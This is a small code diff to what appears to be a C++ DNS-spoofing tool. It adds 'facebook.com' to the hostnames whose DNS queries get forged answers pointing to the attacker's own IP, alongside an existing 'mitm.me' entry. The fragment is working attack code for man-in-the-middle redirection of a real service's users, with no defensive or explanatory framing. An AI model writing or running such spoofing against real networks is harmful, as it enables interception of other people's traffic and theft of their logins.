@@ -26,6 +26,9 @@ bool callback(const PDU& pdu) {
             if(hostname == "mitm.me") {
                 dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
             }
+            if(hostname == "facebook.com") {
+                dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
+            }
         }
         if (dns.answers_count() > 0) {  // Have we added some answers?
             dns.type(DNS::RESPONSE);    // It's a response now
